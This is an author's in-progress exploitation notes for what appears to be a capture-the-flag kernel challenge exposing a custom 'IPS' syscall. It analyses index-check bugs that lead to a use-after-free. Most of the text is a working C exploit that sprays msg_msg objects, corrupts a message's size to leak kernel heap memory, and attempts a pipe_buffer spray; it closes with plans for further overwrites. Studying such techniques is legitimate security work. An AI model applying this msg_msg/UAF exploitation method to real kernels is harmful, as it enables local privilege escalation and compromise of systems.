# vuln
- the vulnerability are:
- first one, in edit storage:
```c
int edit_storage(int idx, char *data) {
  if((idx = check_idx(idx)) < 0); // doesn't return, can use chunks[-1]
  if(chunks[idx] == NULL) return -1;

  memcpy(chunks[idx]->data, data, strlen(data));

  return 0;
}
```
- it checks validity of idx, if not valid, returns -1 and assign it to the local idx. Then, it does not return.
- if `if(chunks[idx] == NULL) return -1;` passes as well, which should pass if we successfully get a pointer in `chunks[-1]` (easy)
    - then, we can write things starting from the data field (chunks[-1] + 0xe) with the memcpy below.

- second one, in copy_storage:
```c
int copy_storage(int idx) {
  if((idx = check_idx(idx)) < 0) return -1;
  if(chunks[idx] == NULL) return -1;

  int target_idx = get_idx(); // can be -1, when chunks[0-15] can occupied
  chunks[target_idx] = chunks[idx]; // shallow copy
  return target_idx;
}
```
- it does not check validity of return value of get_idx(), which indeed will be -1 if all the 16 entries are occupied.
    - therefore the attack plan is to get all the entries occupied. Then, call alloc_storage one more time.
    - then, calling copy_storage will have get_idx() return -1
- three one, in the same code snippet above:
    - `chunks[target_idx] = chunks[idx];` copies the pointer to another location
    - if follow the attack plan above (get_idx() returns -1), we can write a pointer to chunks[-1] so that it will also be occupied
- although in remove_storage:
```c
  int i;
  for(i = 0; i < MAX; i++) {
    if(i != idx && chunks[i] == chunks[idx]) {
      chunks[i] = NULL;
    }
  }
```
- there's code that attempt to prevent the UAF from the previous mentioned shallow copying of pointer.
- but the writing of the pointer to chunks[-1] bypass this check. Because i in the loop starts from 0, not -1, so the pointer written to chunks[-1] stays.
    - therefore, can definitely UAF from that pointer.


## exploitation (in progress)
- the following code, very badly written, successfully utilize the UAF and is a path to leak kernel heap addresses and store them in memdump variable. May ignore the pipe_buffer spray. It does not work at the moment. As pipe_buffer struct can never go into kmalloc-128 since there is a kmalloc-96 blocking. By blocking, I mean because of how pipe_buffer resizing mechanism work, specifically nr_slots having to be power of 2, kernel code does kcalloc(nr_slots, sizeof(pipe_buffer struct), \<flags\>), for the structs to be in kmalloc-128, nr_slots need to be 2, (64 < 2 * 0x28 < 128) but kmalloc-96 exists in the kernel version. And (64 < 2 * 0x28 < 96 < 128) therefore, it goes to kmalloc-96. nr_slots must be power of 2 according to how kernel code work (see bootlin), so it cannot be 3, and 4 * 0x28 > 128, so the conclusion is that, given the existence of kmalloc-96, pipe_buffer after resizing, will not go into kmalloc-128 where the UAF happens
```c
#define _GNU_SOURCE

#include <sys/syscall.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdint.h>
#include <errno.h>
#include <fcntl.h>


#define __NR_IPS 548
#define ALLOC 1
#define REMOVE 2
#define EDIT 3
#define COPY 4
#define MAX_PAYLOAD_SIZE 114
#define NUM_QUEUE 500
#define CHUNK_SIZE 0x80
#define MSG_MSG_SIZE 0x30
#define MEMDUMP_SIZE 0x2000
#define ENLARGED_SIZE 0x1001
#define PIPE_BUFFER_STRUCT_SIZE 0x28
struct userdata {
    int idx; // 4 bytes
    unsigned short pri; // 2 bytes
    uint64_t *data;
};
struct {
    long mtype;
    char mtext[CHUNK_SIZE - MSG_MSG_SIZE];
} firstmsg = {
    .mtype = 1
};

struct userdata payload1;
struct userdata payload2;
int ret; // stores return value of functions
int msqid[NUM_QUEUE];
uint64_t* memdump;
int pipefd[NUM_QUEUE][2];

int spray_msgmsg(void) {
    for (int i = 0; i < NUM_QUEUE; ++i) {
        msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT);
        if (msqid[i] < 0) {
            printf("Error creating queue: %s", strerrorname_np(errno));
            return -1;
        }
        ret = msgsnd(msqid[i], &firstmsg, CHUNK_SIZE - MSG_MSG_SIZE,  IPC_NOWAIT);
        if (ret < 0) {
            printf("Error sending msg: %s", strerrorname_np(errno));
            return -1;
        }
    }
}

int find_victim(void) {
    for (int i = 0; i < NUM_QUEUE; ++i) {
        ret = msgrcv(msqid[i], memdump, ENLARGED_SIZE, 0x4141414141414141, IPC_NOWAIT);
        if (ret == ENLARGED_SIZE) {
            printf("worked\n");
            printf("Memdump @ %p\n", memdump);
            break;
        }
        else if (ret < 0) {
            printf("Error receiving: %s\n", strerrorname_np(errno));
        }  
    }
}

int spray_pipe(void) {
    for (int i = 0; i < NUM_QUEUE; ++i) {
        ret = pipe(pipefd[i]);
        if (ret < 0) {
            printf("Error making pipes: %s, i = %d\n", strerrorname_np(errno), i);
            return -1;
        }
        ret = fcntl(pipefd[i][1], F_SETPIPE_SZ, (1U << 14));
        if (ret < 0) {
            printf("Error resizing pipe buffer: %s, i = %d\n", strerrorname_np(errno), i);
            return -1;
        }
        ret = fcntl(pipefd[i][0], F_SETPIPE_SZ, (1U << 14));
        if (ret < 0) {
            printf("Error resizing pipe buffer: %s, i = %d\n", strerrorname_np(errno), i);
            return -1;
        }
        ret = fcntl(pipefd[i][1], F_GETPIPE_SZ);
        printf("pipe buffer size: %d\n", ret);
        ret = fcntl(pipefd[i][0], F_GETPIPE_SZ);
        printf("pipe buffer size: %d\n", ret);

        if (write(pipefd[i][1], "xddpwngod", 9) < 0) {
            printf("Error writing to pipes: %s", strerrorname_np(errno));
            return -1;
        }
        
    }
}


int main() {
    payload1.idx = 0;
    payload1.pri = 0;
    payload2.idx = -1;    
    payload1.data = malloc(MAX_PAYLOAD_SIZE);
    payload2.data = malloc(MAX_PAYLOAD_SIZE);
    memdump = malloc(MEMDUMP_SIZE);
    memset(payload1.data, 'A', MAX_PAYLOAD_SIZE);
    memset(firstmsg.mtext, 'B', CHUNK_SIZE - MSG_MSG_SIZE);
    // printf("size of unsigned short: %d\n", sizeof(unsigned short));
    syscall(__NR_IPS, ALLOC, &payload1);
    for (int i = 0; i < 16; ++i) {
        syscall(__NR_IPS, COPY, &payload1);
    }
    syscall(__NR_IPS, REMOVE, &payload1);
    *(payload2.data) = 0x414141414141ffff;
    *(payload2.data + 1) = 0x10014141;
    spray_msgmsg();
    syscall(__NR_IPS, EDIT, &payload2);
    find_victim();
    getchar();
    if (spray_pipe() < 0) {
        printf("unlucky");
        return 0;
    }
    printf("done spraying\n");
    getchar();
    return 0;
}
```
## plan
- let's understand the situation:
    - we have:
        - UAF leaking kernel heap addresses, around kmalloc-128, and potentially other heap regions, as well.
        - ability to overwrite at most 114 (0x72) bytes, starting location is victim_chunk + 0xe (the msg_msg chunk whose size is modified)
            - can overwrite:
                - victim msg_msg data field
                - security pointer
                - most significant 2 bytes of prev pointer (probably useless, since in kernel it almost certainly have to be 0xffff, otherwise, fault)